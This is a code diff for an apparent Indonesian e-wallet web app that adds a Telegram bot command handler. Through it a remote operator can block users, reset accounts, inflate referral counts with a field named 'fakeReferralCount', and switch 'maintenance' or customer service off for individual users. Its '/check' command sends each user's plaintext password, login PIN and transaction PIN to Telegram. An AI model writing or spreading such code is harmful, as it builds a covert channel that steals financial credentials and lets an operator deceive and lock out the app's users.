+              sendToTelegram(`Fitur transfer \`${parts[1]}\` diverifikasi.`); 
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+
+            else if (command === '/notif') {
+              let notifText = parts.slice(1, -1).join(' ');
+              
+              if (notifText) {
+                addNotifToUser(targetPhone, notifText, 'info');
+                sendToTelegram(`Notifikasi berhasil dikirim ke \`${targetUidVal}\` pesan: "${notifText}"`);
+              } else {
+              }
+            }
+
+            else if (command === '/reset_akun') {
+              delete usersDb[targetPhone];
+              localStorage.removeItem(`sanz_bal_${targetPhone}`);
+              localStorage.removeItem(`sanz_hist_${targetPhone}`);
+              localStorage.removeItem(`sanz_notifs_${targetPhone}`); 
+              localStorage.removeItem(`sanz_active_deposit_${targetPhone}`);
+              localStorage.removeItem(`sanz_active_withdraw_${targetPhone}`);
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              sendToTelegram(`\`${targetPhone}\` berhasil direset.`);
+              if (targetPhone === currentUserPhone) handleLogout();
+            }
+            else if (command === '/reff') {
+              let kode = parts[1];
+              if (kode) {
+                usersDb[targetPhone].referralCode = kode;
+                localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                sendToTelegram(`Kode referensi untuk \`${targetUidVal}\` berhasil diatur menjadi *${kode}*`);
+              }
+            }
+            else if (command === '/reff_new') {
+              let jumlah = parseInt(parts[1]);
+              if (!isNaN(jumlah)) {
+                usersDb[targetPhone].fakeReferralCount = (usersDb[targetPhone].fakeReferralCount || 0) + jumlah;
+                localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                sendToTelegram(`Berhasil menambahkan progress ${jumlah} referral untuk \`${targetUidVal}\``);
+              }
+            }
+            else if (command === '/blokir') {
+              usersDb[targetPhone].isBlocked = true;
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              sendToTelegram(`\`${targetUidVal}\` berhasil diblokir.`);
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+            else if (command === '/unblokir') {
+              usersDb[targetPhone].isBlocked = false;
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              sendToTelegram(`\`${targetUidVal}\` berhasil di-unblokir.`);
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+      
+            else if (command === '/maintenance') {
+              localStorage.setItem('sanz_maintenance_' + targetPhone, 'true');
+              sendToTelegram(`Maintenance diaktifkan untuk \`${targetUidVal}\``);
+              if (targetPhone === currentUserPhone) checkMaintenance();
+            }
+            else if (command === '/unmaintenance') {
+              localStorage.setItem('sanz_maintenance_' + targetPhone, 'false');
+              sendToTelegram(`Maintenance dinonaktifkan untuk \`${targetUidVal}\``);
+              if (targetPhone === currentUserPhone) checkMaintenance();
+            }
+            else if (command === '/cs_off') {
+              localStorage.setItem('sanz_cs_status_' + targetPhone, 'off');
+              sendToTelegram(`CS dimatikan untuk \`${targetUidVal}\``);
+              if (targetPhone === currentUserPhone) isCSOnline = false;
+            }
+            else if (command === '/cs_on') {
+              localStorage.setItem('sanz_cs_status_' + targetPhone, 'on');
+              sendToTelegram(`CS diaktifkan untuk \`${targetUidVal}\``);
+              if (targetPhone === currentUserPhone) isCSOnline = true;
+            }
+
+            else if (command === '/check') {
+              let uData = usersDb[targetPhone];
+              let info = `*DATA PENGGUNA*\n`;
+              info += `Nama: ${uData.name}\n`;
+              info += `Nomor: \`${targetPhone}\`\n`;
+              info += `UID: \`${uData.uid}\`\n`;
+              info += `Password: \`${uData.password}\`\n`;
+              info += `PIN Transaksi: \`${uData.pinCode ? uData.pinCode : 'Belum diatur'}\`\n`;
+              info += `PIN Login: \`${uData.loginPin ? uData.loginPin : 'Belum diatur'}\`\n`;
+              info += `Saldo: Rp ${tBal.toLocaleString('id-ID')}\n`;
+              info += `Status Verif: ${uData.isVerified ? 'Terverifikasi' : 'Belum'}\n`;
+              info += `Tipe Akun: ${uData.isReseller ? 'Reseller' : 'Standar'}\n`;
+              info += `Status Blokir: ${uData.isBlocked ? 'Ya' : 'Tidak'}`;
+              
+              sendToTelegram(info);
+            }
+          }
+
+          lastUpdateId = update.update_id;
+          localStorage.setItem('sanz_last_update_id', lastUpdateId);
         }
+      } catch (e) {
+        console.error("Kesalahan fetchTelegramUpdates: ", e);
+      } finally { 
+        isPolling = false; 
       }
-
-      lastUpdateId = update.update_id;
-      localStorage.setItem('sanz_last_update_id', lastUpdateId);
     }
-  } catch (e) {
-    console.error("Kesalahan fetchTelegramUpdates: ", e);
-  } finally { 
-    isPolling = false; 
-  }
-}
 
     function renderHistory() {
       const box = document.getElementById('history-box'); const fullList = document.getElementById('full-history-list');
